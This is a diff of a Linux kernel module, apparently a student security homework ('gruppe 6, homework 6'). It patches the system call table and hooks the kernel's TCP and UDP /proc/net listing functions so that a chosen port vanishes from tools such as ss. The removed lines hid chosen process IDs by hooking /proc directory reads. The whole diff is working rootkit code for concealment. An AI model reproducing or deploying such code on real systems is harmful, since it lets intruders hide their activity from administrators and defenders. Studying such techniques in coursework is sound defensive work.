@@ -7,9 +7,7 @@
 #include <net/net_namespace.h>
 #include <linux/socket.h>
 #include <linux/types.h>
-//#include <asm/unistd.h>
-#include <asm-generic/unistd.h>
-
+#include <net/inet_sock.h>
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
 
@@ -34,68 +32,57 @@ struct proc_dir_entry *proc;
 fun_int_seq_file_void tcp_show_orig;
 fun_int_seq_file_void udp_show_orig;
 
-//
-static int pids_to_hide[256];
-static int pids_count = 0;
-module_param_array(pids_to_hide, int, &pids_count, 0000);
-MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");
-
-
-// we convert all pids to strings in load_module for easier comparison later on
-char **char_pids_to_hide;
-
-int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    int i;
-    for(i = 0; i<pids_count; i++)
-    {
-        if(strcmp(char_pids_to_hide[i], name)==0){
-            OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
-            return 0;
-        }
-    }
-
-    return original_proc_fillfir(__buf, name, namelen, offset, ino, d_type);
-}
-
-int hooked_readdir(struct file *filep, void *dirent, filldir_t filldir)
-{
-    original_proc_fillfir = filldir;
-    return proc_original_readdir(filep, dirent, hooked_proc_filldir);
-}
+int port_to_hide;
+MODULE_PARM_DESC(port_to_hide, "Port to hide.");
+module_param(port_to_hide, int, 0000);
+char* prot_to_hide;
+module_param(prot_to_hide, charp, 0000);
 
 static int hooked_udp_show(struct seq_file* file, void* v){
-    return 0;
+    int port;
+    struct sock* sk;
+    struct inet_sock* s;
+    if (strcmp(prot_to_hide, "udp")){
+        return udp_show_orig(file, v);
+    }
+    if (v == SEQ_START_TOKEN) {
+        return udp_show_orig(file, v);
+    }
+    sk = (struct sock*) v;
+    s = inet_sk(sk);
+    OUR_DEBUG("pointer : %p\n", s);
+    port = ntohs(s->sport);
+    OUR_DEBUG("udp_show port: %d\n", s->sport);
+    if (port == port_to_hide){
+        return 0;
+    } 
+    return udp_show_orig(file, v);
 }
 
 static int hooked_tcp_show(struct seq_file* file, void* v){
-    return 0;
-}
-
-asmlinkage long hooked_sendmsg(int fd, struct msghdr __user* msg, unsigned flags){
-    OUR_DEBUG("Hooked sendmsg\n");
-    return orig_sendmsg(fd, msg, flags);
-}
-
-int find_syscall(void* addr){
-    void** syscall_table = ptr_sys_call_table;
-    void** ptr_to_sys_call;
-    int i;
-    i = 0;
-    ptr_to_sys_call = ptr_sys_call_table;
-    while((void*)addr - *(void**)ptr_to_sys_call){
-        i++;
-        ptr_to_sys_call++;
+    int port;
+    struct sock* sk;
+    struct inet_sock* s;    
+    if (strcmp(prot_to_hide, "tcp")){
+        return tcp_show_orig(file, v);
     }
-    return i;
-
+    if (v == SEQ_START_TOKEN) {
+        return tcp_show_orig(file, v);
+    }
+    sk = (struct sock*) v;
+    s = inet_sk(sk);
+    OUR_DEBUG("pointer : %p\n", s);
+    port = ntohs(s->sport);
+    OUR_DEBUG("tcp_show port: %d, %d\n", port, port_to_hide);
+    if (port == port_to_hide){
+        return 0;
+    } 
+    return tcp_show_orig(file, v);
 }
 
 asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
-    OUR_DEBUG("hooked_socketcall with call %d\n", call);
-    if (call==1)
-        return -1;
-    return 0;
-    return orig_socketcall(call, args);
+    // returning -1 causes ss to try it via /proc/net, which we already hooked
+    return -1;
 }
 
 void hide_sockets(void){
@@ -103,7 +90,6 @@ void hide_sockets(void){
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
     void** syscall_table = (void*)ptr_sys_call_table;
-    void** pointer_to_sys_sendmsg;
     int i;
     while (p){
         if (strcmp(p->name, "tcp")==0){
@@ -125,21 +111,9 @@ void hide_sockets(void){
         p = p->next;
     }
     i = 0;
-    pointer_to_sys_sendmsg = syscall_table;
-    OUR_DEBUG("Test: %d, %d\n", __NR_write, find_syscall(ptr_sys_sendmsg));
-    while ((void*)ptr_sys_sendmsg - *(void**)pointer_to_sys_sendmsg){
-        i++;
-        pointer_to_sys_sendmsg++;
-    }
-    nr_sys_sendmsg = i;
-    OUR_DEBUG("Index: %d\n", __NR_sendmsg);
-    OUR_DEBUG("Found an address: %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
-    orig_sendmsg = (fun_long_int_struct_msghdr_unsigned)*pointer_to_sys_sendmsg;
     orig_socketcall = (fun_long_int_unsigned_long)syscall_table[__NR_socketcall];
-    make_page_writable((long unsigned int)pointer_to_sys_sendmsg);
     make_page_writable((long unsigned int)ptr_sys_call_table);
     syscall_table[__NR_socketcall] = hooked_socketcall;
-    OUR_DEBUG("New contents:     %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
 }
 
 void unhide_sockets(void){
@@ -166,21 +140,11 @@ void unhide_sockets(void){
     syscall_table[__NR_socketcall] = orig_socketcall;
 }
 
-// helper function to compute log10 of some int, needed for knowing how much mem to allocate
-int log10(int i)
-{
-    int result = 0;
-    while(i>0){
-        result++;
-        i /= 10;
-    }
-    return result;
-}
-
 /* Initialization routine */
 static int __init _init_module(void)
 {
     printk(KERN_INFO "This is the kernel module of gruppe 6, homework 6.\n");
+    OUR_DEBUG("%d\n", __NR_socketcall);
     hide_sockets();
 
     return 0;
@@ -189,11 +153,6 @@ static int __init _init_module(void)
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
-    int i;
-    for(i = 0; i<pids_count; i++){
-        kfree(char_pids_to_hide[i]);
-    }
-    kfree(char_pids_to_hide);
     unhide_sockets();
     printk(KERN_INFO "Gruppe 6 says goodbye.\n");
 }
